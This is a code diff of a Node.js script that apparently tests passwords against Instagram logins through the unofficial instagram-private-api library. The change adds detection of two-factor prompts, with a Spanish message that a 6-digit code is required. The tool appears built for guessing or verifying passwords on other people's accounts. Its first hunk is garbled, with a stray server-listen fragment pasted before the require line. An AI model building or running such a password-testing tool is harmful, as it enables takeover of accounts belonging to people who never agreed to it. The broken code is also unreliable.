@@ -1,4 +1,5 @@
-const WebSocket = require('ws');
+n http://localhost:${PORT}`);
+});const WebSocket = require('ws');
 const express = require('express');
 const { IgApiClient } = require('instagram-private-api');
 require('dotenv').config();
@@ -19,6 +20,10 @@ async function testPassword(username, password) {
     await ig.account.login(username, password);
     return { success: true, password };
   } catch (error) {
+    // Detectar si se requiere un código de 6 dígitos
+    if (error.message.includes('two_factor_required')) {
+      return { success: false, password, message: 'Se requiere un código de 6 dígitos para la verificación.' };
+    }
     return { success: false, password, message: error.message };
   }
 }
